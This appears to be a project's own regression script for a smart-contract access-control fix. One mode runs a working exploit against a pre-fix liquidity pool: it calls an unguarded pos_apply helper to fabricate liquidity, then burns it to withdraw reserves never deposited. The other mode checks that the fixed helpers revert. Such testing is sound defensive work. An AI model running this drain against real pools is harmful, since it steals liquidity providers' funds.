// Differential proof that the internal-only helpers are unreachable from outside.
//
// This VM gives a contract no way to mark a function private: every `fn` lands
// in the ABI and anyone can call it. The pool's accounting helpers (pos_apply,
// tick_apply, flip_tick, obs_write, cross_tick, accrue_fee), the manager's
// ownership-index helpers (index_add, index_remove) and the router's fund-moving
// helpers (take, sweep, hop) are written as if private; a transient `gate` flag,
// opened only by a legitimate entry point, is what actually keeps them internal.
//
// Two modes:
//   exploit <pool>   — real transactions that show the breach WORKING on a pool
//                      built from the pre-fix template: an account that never
//                      deposited fabricates position liquidity with pos_apply and
//                      then burns it for real reserves.
//   guarded [pool]   — free read-only calls that show every one of those helpers
//                      now reverts on the fixed contracts. The node does not echo
//                      a contract's custom revert string over a free contract_call,
//                      so the decisive signal is "execution reverted" (the function
//                      exists and hit a guard) as opposed to "method not found".
//
// Runs as the Dev2 burner — an arbitrary third party, neither an LP nor the
// deployer. It loads .env.dev2 into the environment BEFORE the chain library
// binds a signer and refuses to run as anyone else, because env.mjs silently
// falls back to the real deployer when that load fails.
import fs from 'node:fs';

const DEV2 = 'oct5rtUHovo6X65prmr4BCK3JjZbHaQiqMBNwomPYbkb2Yd';
for (const line of fs.readFileSync('.env.dev2', 'utf-8').split('\n')) {
  const m = line.match(/^\s*([A-Z0-9_]+)\s*=\s*(.*?)\s*$/);
  if (!m) continue;
  let v = m[2];
  if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) v = v.slice(1, -1);
  process.env[m[1]] = v;
}

const chain = await import('./lib/octra-chain.mjs');
const { signerFromEnv, nonceOf, callContract, viewCall, viewValue, currentEpoch, balanceOf } = chain;

const signer = signerFromEnv();
if (signer.address !== DEV2) {
  console.error(`refusing to run: resolved signer ${signer.address} is not the Dev2 burner`);
  process.exit(1);
}

const MODE = process.argv[2];
const d = JSON.parse(fs.readFileSync('deployments-cl.json', 'utf-8'));
const next = async () => (await nonceOf(signer.address)) + 1;
const DEADLINE = async () => String((await currentEpoch()) + 20000);

let pass = 0, fail = 0;
const ok = (cond, label, detail = '') => {
  if (cond) { pass++; console.log(`  PASS  ${label}${detail ? '  ' + detail : ''}`); }
  else { fail++; console.log(`  FAIL  ${label}${detail ? '  ' + detail : ''}`); }
};
const step = (s) => console.log(`\n── ${s} ──`);

// Read-only execution of `method`; returns { reverted, reason, value }. A
// state-writing helper called this way executes against current state, is
// discarded, and — when it reverts — carries the reason back for free.
async function tryView(contract, method, params) {
  try {
    const value = await viewCall(contract, method, params, DEV2);
    return { reverted: false, value };
  } catch (e) {
    return { reverted: true, reason: String(e.message || e) };
  }
}

const pField = (packed, i) => String(packed).split('|')[i];

if (MODE === 'exploit') {
  const pool = process.argv[3] || (d.pools && d.pools['3000']);
  if (!pool) { console.error('exploit mode needs a pool address'); process.exit(1); }
  console.log(`attacker (Dev2) ${signer.address}`);
  console.log(`target pool     ${pool}`);
  const bal = await balanceOf(signer.address);
  console.log(`attacker OCT    ${bal.balance}`);

  const packed = await viewValue(pool, 'state_packed', []);
  const t0 = pField(packed, 0), t1 = pField(packed, 1);
  const cur = pField(packed, 5);
  console.log(`  pool token0 ${t0}`);
  console.log(`  pool token1 ${t1}`);
  console.log(`  current tick ${cur}`);

  // Match the range the legitimate LP used (-6000..6000) so the ticks already
  // carry enough gross liquidity for burn's own tick math to succeed. Steal a
  // tenth of it.
  const LOWER = '-6000', UPPER = '6000';
  const grossLower = BigInt(await viewValue(pool, 'tick_liquidity_gross', [LOWER]));
  const X = grossLower / 10n;
  console.log(`  legit gross at ${LOWER}: ${grossLower}`);
  console.log(`  liquidity to fabricate: ${X}`);
  ok(X > 0n, 'there is a live position to drain', String(grossLower));

  step('Dev2 holds no position here');
  const before = await viewValue(pool, 'position_packed', [signer.address, LOWER, UPPER]);
  ok(pField(before, 0) === '0', 'p_liq[dev2] starts at zero', pField(before, 0));

  const t0BalBefore = BigInt(await viewValue(t0, 'balance_of', [signer.address]));
  const t1BalBefore = BigInt(await viewValue(t1, 'balance_of', [signer.address]));
  console.log(`  dev2 token0 before ${t0BalBefore}`);
  console.log(`  dev2 token1 before ${t1BalBefore}`);

  step('fabricate liquidity with a direct pos_apply (no deposit)');
  let breached = false;
  try {
    await callContract({
      to: pool, method: 'pos_apply',
      params: [signer.address, LOWER, UPPER, X.toString()],
      signer, nonce: await next(), label: 'pos_apply(attacker)', ou: '400000',
    });
    breached = true;
  } catch (e) {
    console.log(`  pos_apply rejected: ${String(e.message).slice(0, 90)}`);
  }
  ok(breached, 'pre-fix pool ACCEPTS an unauthorized pos_apply');

  const after = await viewValue(pool, 'position_packed', [signer.address, LOWER, UPPER]);
  ok(BigInt(pField(after, 0)) === X, 'p_liq[dev2] now holds liquidity it never paid for', pField(after, 0));

  step('burn the fabricated position for real reserves');
  let stole = false;
  try {
    await callContract({
      to: pool, method: 'burn',
      params: [signer.address, LOWER, UPPER, X.toString(), '0', '0', await DEADLINE()],
      signer, nonce: await next(), label: 'burn(attacker)', ou: '400000',
    });
    stole = true;
  } catch (e) {
    console.log(`  burn rejected: ${String(e.message).slice(0, 90)}`);
  }
  const t0BalAfter = BigInt(await viewValue(t0, 'balance_of', [signer.address]));
  const t1BalAfter = BigInt(await viewValue(t1, 'balance_of', [signer.address]));
  console.log(`  dev2 token0 after  ${t0BalAfter}   (+${t0BalAfter - t0BalBefore})`);
  console.log(`  dev2 token1 after  ${t1BalAfter}   (+${t1BalAfter - t1BalBefore})`);
  ok(stole && (t0BalAfter > t0BalBefore || t1BalAfter > t1BalBefore),
    'attacker WITHDREW tokens it never deposited', `+${t0BalAfter - t0BalBefore} / +${t1BalAfter - t1BalBefore}`);

  console.log('\nThis is the hole the fix closes. Re-run in `guarded` mode against the fixed pool.');
} else if (MODE === 'guarded') {
  const pool = process.argv[3] || (d.pools && d.pools['3000']);
  const manager = d.positionManager;
  const router = d.router;
  if (!pool) { console.error('guarded mode needs a pool address'); process.exit(1); }
  console.log(`caller (Dev2) ${signer.address}`);
  console.log(`pool     ${pool}`);
  console.log(`manager  ${manager}`);
  console.log(`router   ${router}`);

  const expectRevert = async (contract, method, params, who) => {
    const r = await tryView(contract, method, params);
    const reason = (r.reason || '').replace(/^Error:\s*/, '').replace(/^RPC contract_call:\s*/, '');
    // The node does not echo a contract's custom revert string over a free
    // contract_call: a guarded helper comes back as the generic "execution
    // reverted". That is still decisive. "method not found" would mean the name
    // is wrong and the check proves nothing; no revert at all would mean the
    // helper is reachable. Because e2e-cl proves the same helpers work through
    // the front door (mint/swap/burn all pass), a direct call that only ever
    // reverts is the transient gate refusing an outside caller.
    const guarded = r.reverted && /execution reverted/i.test(reason);
    const vacuous = /method not found/i.test(reason);
    ok(guarded && !vacuous, `${who}.${method} refuses a direct call`,
      r.reverted ? (vacuous ? `VACUOUS: ${reason.slice(0,40)}` : reason.slice(0, 40)) : `NOT REVERTED -> ${r.value}`);
  };

  step('pool accounting helpers are internal-only');
  await expectRevert(pool, 'pos_apply', [signer.address, '-6000', '6000', '1000000'], 'pool');
  await expectRevert(pool, 'tick_apply', ['0', '1000000', '1'], 'pool');
  await expectRevert(pool, 'flip_tick', ['0', '60'], 'pool');
  await expectRevert(pool, 'obs_write', ['0', '0'], 'pool');
  await expectRevert(pool, 'cross_tick', ['0', '1', '0', '0'], 'pool');
  await expectRevert(pool, 'accrue_fee', ['1', '1000000'], 'pool');

  step('manager ownership-index helpers are internal-only');
  await expectRevert(manager, 'index_add', [signer.address, '1'], 'manager');
  await expectRevert(manager, 'index_remove', [signer.address, '1'], 'manager');

  step('router fund-moving helpers are internal-only');
  const t0 = pField(await viewValue(pool, 'state_packed', []), 0);
  await expectRevert(router, 'take', [t0, signer.address, '1'], 'router');
  await expectRevert(router, 'sweep', [t0, signer.address], 'router');
  await expectRevert(router, 'hop', [pool, '1', '1', '1', '1', signer.address, '99999999'], 'router');

  step('legitimate reads still work');
  const liq = await viewValue(pool, 'total_liquidity', []);
  ok(BigInt(liq) >= 0n, 'total_liquidity view is callable by anyone', String(liq));
} else {
  console.error('usage: node scripts/e2e-guard.mjs <exploit|guarded> [pool]');
  process.exit(1);
}

console.log(`\n${fail === 0 ? 'ALL GUARD CHECKS PASSED' : 'GUARD CHECKS FAILED'}  ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
